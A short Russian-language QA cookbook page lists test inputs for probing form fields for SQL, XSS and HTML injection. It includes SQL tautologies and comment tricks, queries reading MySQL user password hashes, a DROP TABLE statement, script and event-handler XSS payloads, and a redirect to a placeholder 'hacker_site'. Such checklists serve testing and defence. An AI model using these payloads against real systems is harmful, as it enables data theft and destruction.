[Link to source](https://akkaparallel.blogspot.com/2013/06/email.html)
#cookbook

# Чек-лист проверок для полей на XSS, SQL- и HTML-инъекции

## **SQL:**
```
кавычка '
OR '1'='1'
' or '1'='1' -- '
' or '1'='1' ({ '
' or '1'='1' /* '
12345) AND 1=1--:hash
SELECT user(); или SELECT system_user();
SELECT host, user, password FROM mysql.user;
SELECT database()
DROP TABLE user;
```

## **XSS:**
```
<script>alert("xss-injection!")</script>
<script>document.getElementByID("...").disabled=true</script>
<script>window.parent.location.href='http://hacker_site';</script>
<img src=javascript:alert('xss-injection!')>
<input onclick="javascript:alert('xss-injection');">
<b onmouseover="alert('xss-injection!')">Hello</b>
```

## **HTML:**
```
</body>
<textarea />
<input></input>
<form action="http://google.com"><input type="submit"></form>
```

